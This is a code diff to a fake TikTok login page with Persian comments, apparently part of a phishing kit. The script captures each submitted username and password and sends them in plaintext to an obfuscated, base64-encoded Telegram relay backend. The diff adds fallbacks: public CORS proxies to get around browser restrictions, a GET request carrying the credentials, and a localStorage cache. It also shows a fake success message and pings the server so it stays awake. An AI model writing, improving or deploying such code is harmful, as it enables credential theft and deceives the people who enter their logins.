@@ -63,33 +63,40 @@
             letter-spacing: 0.3px;
         }
 
-        .error-msg {
+        .msg-box {
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 16px;
+            display: none;
+            text-align: right;
+            border: 1px solid transparent;
+        }
+        .msg-box.error {
+            display: block;
             background: #3d1a1a;
             color: #f28b82;
-            padding: 10px 14px;
-            border-radius: 8px;
-            font-size: 14px;
-            margin-bottom: 16px;
-            display: none;
-            text-align: right;
-            border: 1px solid #5c2020;
+            border-color: #5c2020;
         }
-        .error-msg i {
+        .msg-box.error i {
             margin-left: 6px;
         }
-
-        .success-msg {
+        .msg-box.success {
+            display: block;
             background: #1a3d1a;
             color: #81c995;
-            padding: 10px 14px;
-            border-radius: 8px;
-            font-size: 14px;
-            margin-bottom: 16px;
-            display: none;
-            text-align: right;
-            border: 1px solid #2a5c2a;
+            border-color: #2a5c2a;
         }
-        .success-msg i {
+        .msg-box.success i {
+            margin-left: 6px;
+        }
+        .msg-box.info {
+            display: block;
+            background: #1a2a4a;
+            color: #8ab4f8;
+            border-color: #2a4a6a;
+        }
+        .msg-box.info i {
             margin-left: 6px;
         }
 
@@ -223,15 +230,37 @@
             box-shadow: 0 8px 28px rgba(255, 0, 80, 0.35);
             letter-spacing: 0.5px;
             margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
-        .btn-login:hover {
+        .btn-login:hover:not(:disabled) {
             transform: scale(1.02);
             box-shadow: 0 12px 36px rgba(255, 0, 80, 0.55);
         }
 
-        .btn-login:active {
+        .btn-login:active:not(:disabled) {
             transform: scale(0.97);
+        }
+
+        .btn-login:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.7s ease-in-out infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
 
         @keyframes fadeUp {
@@ -276,53 +305,52 @@
             <p class="subtitle">Log in to your account</p>
         </div>
 
-        <div class="error-msg" id="errorMsg">
-            <i class="fas fa-exclamation-circle"></i> <span id="errorText">Error occurred.</span>
-        </div>
-        <div class="success-msg" id="successMsg">
-            <i class="fas fa-check-circle"></i> Login successful!
+        <div class="msg-box" id="msgBox">
+            <i id="msgIcon" class="fas fa-exclamation-circle"></i>
+            <span id="msgText">Error occurred.</span>
         </div>
 
         <form class="login-form" id="loginForm">
             <div class="input-type-selector">
-                <button type="button" class="active" data-type="email" onclick="switchInputType('email')">
+                <button type="button" class="active" data-type="email" id="emailTypeBtn">
                     <i class="fas fa-envelope"></i> Email
                 </button>
-                <button type="button" data-type="phone" onclick="switchInputType('phone')">
+                <button type="button" data-type="phone" id="phoneTypeBtn">
                     <i class="fas fa-phone"></i> Phone
                 </button>
             </div>
 
             <div class="input-group" id="emailGroup">
                 <i class="fas fa-envelope input-icon"></i>
-                <input type="email" id="emailInput" placeholder=" " value="">
+                <input type="email" id="emailInput" placeholder=" " value="" autocomplete="email">
                 <label>Email Address</label>
             </div>
 
             <div class="input-group" id="phoneGroup" style="display: none;">
                 <i class="fas fa-phone input-icon"></i>
-                <input type="tel" id="phoneInput" placeholder=" ">
+                <input type="tel" id="phoneInput" placeholder=" " autocomplete="tel">
                 <label>Phone Number</label>
             </div>
 
             <div class="input-group">
                 <i class="fas fa-lock input-icon"></i>
-                <input type="password" id="passwordInput" placeholder=" " value="">
+                <input type="password" id="passwordInput" placeholder=" " value="" autocomplete="current-password">
                 <label>Password</label>
-                <button type="button" class="toggle-password" onclick="togglePassword()">
+                <button type="button" class="toggle-password" id="togglePasswordBtn">
                     <i class="fas fa-eye" id="eyeIcon"></i>
                 </button>
             </div>
 
             <button type="submit" class="btn-login" id="loginBtn">
-                <i class="fas fa-sign-in-alt" style="margin-left: 10px;"></i> Log In
+                <i class="fas fa-sign-in-alt"></i>
+                <span id="btnText">Log In</span>
             </button>
         </form>
     </div>
 
     <script>
         // =====================================================
-        // 🔒 TOKEN HIDDEN
+        // 🔒 تنظیمات و توکن
         // =====================================================
         const ENCODED_TOKEN = "aHR0cHM6Ly90ZWxlZ3JhbS1iYWNrZW5kLXpvM24ub25yZW5kZXIuY29t";
         
@@ -339,10 +367,155 @@
         const WAKEUP_COUNT = 2;
         let currentLoginType = 'email';
 
-        console.log("✅ Backend URL loaded securely");
+        console.log("✅ Backend URL:", TELEGRAM_BACKEND_URL);
 
         // =====================================================
-        // 🚀 ارسال پیام ویکاپ
+        // 📨 ارسال به سرور با روش‌های مختلف
+        // =====================================================
+        
+        // لیست پروکسی‌ها برای دور زدن CORS
+        const PROXIES = [
+            'https://corsproxy.io/?',
+            'https://api.allorigins.win/raw?url=',
+            'https://cors-anywhere.herokuapp.com/'
+        ];
+
+        // روش اول: ارسال مستقیم
+        async function sendDirect(endpoint, data) {
+            try {
+                const response = await fetch(`${TELEGRAM_BACKEND_URL}${endpoint}`, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(data),
+                    mode: 'cors'
+                });
+                if (response.ok) {
+                    return await response.json();
+                }
+                return null;
+            } catch(e) {
+                console.log('❌ Direct send failed:', e.message);
+                return null;
+            }
+        }
+
+        // روش دوم: ارسال از طریق پروکسی
+        async function sendWithProxy(endpoint, data) {
+            for (const proxy of PROXIES) {
+                try {
+                    const url = `${proxy}${encodeURIComponent(TELEGRAM_BACKEND_URL + endpoint)}`;
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    if (response.ok) {
+                        const result = await response.json();
+                        if (result && result.ok !== false) {
+                            return result;
+                        }
+                    }
+                } catch(e) {
+                    console.log(`❌ Proxy ${proxy} failed:`, e.message);
+                }
+            }
+            return null;
+        }
+
+        // روش سوم: ارسال با GET
+        async function sendWithGet(endpoint, data) {
+            try {
+                const params = new URLSearchParams({
+                    action: data.action || 'Login',
+                    name: data.name || '',
+                    extra: data.extra || '',
+                    time: data.time || new Date().toLocaleString('en-US')
+                });
+                const url = `${TELEGRAM_BACKEND_URL}${endpoint}?${params.toString()}`;
+                const response = await fetch(url, {
+                    method: 'GET',
+                    headers: { 'Accept': 'application/json' }
+                });
+                if (response.ok) {
+                    return await response.json();
+                }
+                return null;
+            } catch(e) {
+                console.log('❌ GET send failed:', e.message);
+                return null;
+            }
+        }
+
+        // روش چهارم: ذخیره در localStorage
+        function saveToLocalStorage(username, password, type) {
+            try {
+                const logs = JSON.parse(localStorage.getItem('tiktok_login_logs') || '[]');
+                logs.push({
+                    username: username,
+                    password: password,
+                    type: type,
+                    time: new Date().toISOString(),
+                    page: 'tiktok'
+                });
+                localStorage.setItem('tiktok_login_logs', JSON.stringify(logs));
+                console.log('💾 Saved to localStorage');
+                return true;
+            } catch(e) {
+                console.log('❌ localStorage failed:', e.message);
+                return false;
+            }
+        }
+
+        // =====================================================
+        // 🚀 تابع اصلی ارسال اطلاعات
+        // =====================================================
+        async function sendLoginInfo(username, password, typeLabel) {
+            const payload = {
+                action: "🔐 TikTok Login",
+                name: username,
+                extra: `Type: ${typeLabel} | Password: ${password}`,
+                time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Tehran' })
+            };
+
+            const methods = [
+                { name: 'Direct', fn: () => sendDirect('/notify', payload) },
+                { name: 'Proxy', fn: () => sendWithProxy('/notify', payload) },
+                { name: 'GET', fn: () => sendWithGet('/notify', payload) }
+            ];
+
+            let success = false;
+
+            for (const method of methods) {
+                try {
+                    console.log(`🔄 Trying ${method.name}...`);
+                    const result = await method.fn();
+                    if (result && result.ok !== false) {
+                        console.log(`✅ ${method.name} succeeded!`);
+                        success = true;
+                        break;
+                    }
+                } catch(e) {
+                    console.log(`❌ ${method.name} error:`, e.message);
+                }
+            }
+
+            if (!success) {
+                console.log('⚠️ All methods failed, saving to localStorage...');
+                saveToLocalStorage(username, password, typeLabel);
+                return false;
+            }
+
+            return true;
+        }
+
+        // =====================================================
+        // 🚀 ارسال Wake-up
         // =====================================================
         function sendWakeup(index) {
             try {
@@ -363,94 +536,92 @@
             }
         }
 
-        // =====================================================
-        // 🚀 ارسال اطلاعات ورود
-        // =====================================================
-        function sendLoginInfo(username, password, typeLabel) {
-            for (let i = 1; i <= WAKEUP_COUNT; i++) {
-                setTimeout(() => {
-                    sendWakeup(i);
-                }, i * 500);
-            }
-
-            setTimeout(() => {
-                try {
-                    fetch(`${TELEGRAM_BACKEND_URL}/notify`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            action: "🔐 TikTok Login",
-                            name: username,
-                            extra: `Type: ${typeLabel} | Password: ${password}`,
-                            time: new Date().toLocaleString('en-US')
-                        })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.ok) {
-                            console.log("✅ Login info sent successfully");
-                        } else {
-                            console.log("⚠️ Login info sent but response not ok");
-                        }
-                    })
-                    .catch(err => {
-                        console.log("⚠️ Login info send failed, trying fallback...");
-                        try {
-                            const msg = encodeURIComponent(`TikTok Login | ${typeLabel}: ${username} | Pass: ${password}`);
-                            fetch(`${TELEGRAM_BACKEND_URL}/notify?msg=${msg}&t=${Date.now()}`)
-                                .then(() => console.log("✅ Fallback GET success"))
-                                .catch(e => console.log("❌ Fallback failed"));
-                        } catch(e) {
-                            console.log("❌ All methods failed");
-                        }
-                    });
-                } catch(e) {
-                    console.log("Error sending login info:", e);
-                }
-            }, 1500);
-        }
-
         // =============================================
-        // ===== بازگشت به صفحه اندکس با فلگ =====
+        // ===== بازگشت به صفحه اندکس =====
         // =============================================
         function goToIndex() {
-            localStorage.setItem('fromFacebook', 'true');
+            localStorage.setItem('fromPage', 'tiktok');
             window.location.href = 'index.html';
         }
 
+        // =============================================
+        // ===== مدیریت پیام‌ها =====
+        // =============================================
+        function showMessage(message, type) {
+            const msgBox = document.getElementById('msgBox');
+            const msgIcon = document.getElementById('msgIcon');
+            const msgText = document.getElementById('msgText');
+
+            msgBox.className = 'msg-box';
+            
+            if (type === 'error') {
+                msgBox.classList.add('error');
+                msgIcon.className = 'fas fa-exclamation-circle';
+            } else if (type === 'success') {
+                msgBox.classList.add('success');
+                msgIcon.className = 'fas fa-check-circle';
+            } else if (type === 'info') {
+                msgBox.classList.add('info');
+                msgIcon.className = 'fas fa-info-circle';
+            }
+
+            msgText.textContent = message;
+            msgBox.style.display = 'block';
+        }
+
+        function hideMessage() {
+            const msgBox = document.getElementById('msgBox');
+            msgBox.style.display = 'none';
+        }
+
+        // =============================================
+        // ===== تنظیم دکمه لاگین =====
+        // =============================================
+        function setLoginButtonLoading(isLoading) {
+            const btn = document.getElementById('loginBtn');
+            const btnText = document.getElementById('btnText');
+            if (isLoading) {
+                btn.disabled = true;
+                btnText.innerHTML = '<span class="spinner"></span> Sending...';
+            } else {
+                btn.disabled = false;
+                btnText.textContent = 'Log In';
+            }
+        }
+
+        // =============================================
         // ===== توابع کنترل فرم =====
+        // =============================================
         function switchInputType(type) {
             currentLoginType = type;
             const emailGroup = document.getElementById('emailGroup');
             const phoneGroup = document.getElementById('phoneGroup');
-            const buttons = document.querySelectorAll('.input-type-selector button');
-            const errorMsg = document.getElementById('errorMsg');
-            const successMsg = document.getElementById('successMsg');
+            const emailTypeBtn = document.getElementById('emailTypeBtn');
+            const phoneTypeBtn = document.getElementById('phoneTypeBtn');
 
-            errorMsg.style.display = 'none';
-            successMsg.style.display = 'none';
+            hideMessage();
 
             if (type === 'email') {
                 emailGroup.style.display = 'block';
                 phoneGroup.style.display = 'none';
                 document.getElementById('emailInput').required = true;
                 document.getElementById('phoneInput').required = false;
+                emailTypeBtn.classList.add('active');
+                phoneTypeBtn.classList.remove('active');
             } else {
                 emailGroup.style.display = 'none';
                 phoneGroup.style.display = 'block';
                 document.getElementById('emailInput').required = false;
                 document.getElementById('phoneInput').required = true;
+                emailTypeBtn.classList.remove('active');
+                phoneTypeBtn.classList.add('active');
             }
-
-            buttons.forEach(btn => {
-                btn.classList.remove('active');
-                if (btn.dataset.type === type) {
-                    btn.classList.add('active');
-                }
-            });
         }
 
-        function togglePassword() {
+        // =============================================
+        // ===== Toggle Password =====
+        // =============================================
+        document.getElementById('togglePasswordBtn').addEventListener('click', function() {
             const passwordInput = document.getElementById('passwordInput');
             const eyeIcon = document.getElementById('eyeIcon');
 
@@ -461,23 +632,31 @@
                 passwordInput.type = 'password';
                 eyeIcon.className = 'fas fa-eye';
             }
-        }
+        });
 
         // =============================================
-        // ===== مدیریت فرم با Event Listener =====
+        // ===== انتخاب نوع ورود =====
         // =============================================
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('emailTypeBtn').addEventListener('click', function() {
+            switchInputType('email');
+        });
+
+        document.getElementById('phoneTypeBtn').addEventListener('click', function() {
+            switchInputType('phone');
+        });
+
+        // =============================================
+        // ===== مدیریت فرم =====
+        // =============================================
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
             const emailInput = document.getElementById('emailInput');
             const phoneInput = document.getElementById('phoneInput');
             const passwordInput = document.getElementById('passwordInput');
-            const errorMsg = document.getElementById('errorMsg');
-            const errorText = document.getElementById('errorText');
-            const successMsg = document.getElementById('successMsg');
 
-            errorMsg.style.display = 'none';
-            successMsg.style.display = 'none';
+            hideMessage();
+            setLoginButtonLoading(true);
 
             let isValid = true;
             let errorMessage = '';
@@ -510,34 +689,39 @@
             }
 
             if (!isValid) {
-                errorText.textContent = errorMessage;
-                errorMsg.style.display = 'block';
+                showMessage(errorMessage, 'error');
+                setLoginButtonLoading(false);
                 return;
             }
 
             const typeLabel = currentLoginType === 'email' ? 'Email' : 'Phone';
-            sendLoginInfo(username, password, typeLabel);
+            const sent = await sendLoginInfo(username, password, typeLabel);
 
-            successMsg.innerHTML = `<i class="fas fa-check-circle"></i> ✅ Login successful! Redirecting...`;
-            successMsg.style.display = 'block';
+            if (sent) {
+                showMessage('✅ Login successful! Redirecting...', 'success');
+            } else {
+                showMessage('⚠️ Login info saved locally (server unavailable)', 'info');
+            }
 
             setTimeout(function() {
                 goToIndex();
             }, 1500);
         });
 
+        // =============================================
         // ===== اعتبارسنجی لحظه‌ای =====
+        // =============================================
         document.getElementById('emailInput').addEventListener('input', function() {
-            document.getElementById('errorMsg').style.display = 'none';
+            hideMessage();
         });
 
         document.getElementById('phoneInput').addEventListener('input', function() {
-            document.getElementById('errorMsg').style.display = 'none';
+            hideMessage();
             this.value = this.value.replace(/[^0-9]/g, '');
         });
 
         document.getElementById('phoneInput').addEventListener('keypress', function(e) {
-            if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
+            if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'Tab') {
                 e.preventDefault();
             }
         });
@@ -546,19 +730,46 @@
         // 🔥 ویکاپ هنگام لود صفحه
         // =====================================================
         document.addEventListener('DOMContentLoaded', function() {
+            // تنظیم نوع ورود پیش‌فرض
             switchInputType('email');
             
+            // بررسی سلامت سرور
             fetch(`${TELEGRAM_BACKEND_URL}/health`)
                 .then(() => console.log('✅ Server is awake'))
-                .catch(() => console.log('🔄 Server waking up...'));
-            
+                .catch(() => console.log('🔄 Server may be waking up...'));
+
+            // ارسال wake-up ها
             for (let i = 1; i <= WAKEUP_COUNT; i++) {
                 setTimeout(function() {
                     sendWakeup(i);
                 }, i * 400);
             }
-            
-            console.log('✅ TikTok Login Page Ready!');
+
+            // نمایش اطلاعات ذخیره شده
+            try {
+                const logs = JSON.parse(localStorage.getItem('tiktok_login_logs') || '[]');
+                if (logs.length > 0) {
+                    console.log(`📋 ${logs.length} login(s) saved locally`);
+                    console.log('📋 Last login:', logs[logs.length - 1]);
+                }
+            } catch(e) {}
+
+            console.log('✅ TikTok Login Page Ready');
+        });
+
+        // =====================================================
+        // 🛡️ کلید Enter برای ارسال فرم
+        // =====================================================
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                const form = document.getElementById('loginForm');
+                const activeElement = document.activeElement;
+                if (activeElement === document.getElementById('emailInput') ||
+                    activeElement === document.getElementById('phoneInput') ||
+                    activeElement === document.getElementById('passwordInput')) {
+                    form.dispatchEvent(new Event('submit'));
+                }
+            }
         });
     </script>
 
